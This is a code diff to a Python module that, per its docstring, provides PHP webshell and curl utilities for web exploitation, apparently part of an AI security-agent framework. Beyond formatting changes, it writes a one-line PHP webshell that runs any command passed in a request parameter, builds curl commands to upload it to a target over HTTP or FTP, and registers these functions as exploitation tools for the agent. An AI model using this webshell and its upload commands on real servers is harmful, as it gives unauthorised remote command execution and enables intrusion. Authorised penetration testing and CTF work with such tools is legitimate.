@@ -3,8 +3,7 @@ PHP webshell and curl utilities for web exploitation
 """
 
 
-def generate_php_webshell(target_url=None, port=None,
-                          protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
+def generate_php_webshell(target_url=None, port=None, protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
     """
     Upload and generate a basic PHP webshell and uploads it via HTTP or FTP
 
@@ -17,7 +16,7 @@ def generate_php_webshell(target_url=None, port=None,
     Returns:
         Tuple of (webshell content, upload command)
     """
-    with open('shell.php', 'w', encoding='utf-8') as f:
+    with open("shell.php", "w", encoding="utf-8") as f:
         f.write("""<?php system($_GET['cmd']); ?>""")
     webshell = """<?php system($_GET['cmd']); ?>"""
 
@@ -31,8 +30,7 @@ def generate_php_webshell(target_url=None, port=None,
         upload_cmd = f"curl -T shell.php ftp://{target_url}:{port}/"
     else:
         # HTTP POST upload
-        upload_cmd = f"curl -X POST http://{
-            target_url}:{port} -F 'file=@shell.php'"
+        upload_cmd = f"curl -X POST http://{target_url}:{port} -F 'file=@shell.php'"
 
     return webshell, upload_cmd
 
@@ -68,3 +66,10 @@ def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unu
     shell = generate_php_webshell()
     curl_cmd = f"""curl -X POST {url} -F "file=@{filename}" """
     return shell, curl_cmd
+
+
+# --- Auto-register with ToolRegistry ---
+from cai.tool_registry import TOOL_REGISTRY  # noqa: E402
+TOOL_REGISTRY.register("generate_php_webshell", generate_php_webshell, categories=['web', 'exploitation'])
+TOOL_REGISTRY.register("curl_webshell", curl_webshell, categories=['web', 'exploitation'])
+TOOL_REGISTRY.register("upload_webshell", upload_webshell, categories=['web', 'exploitation'])
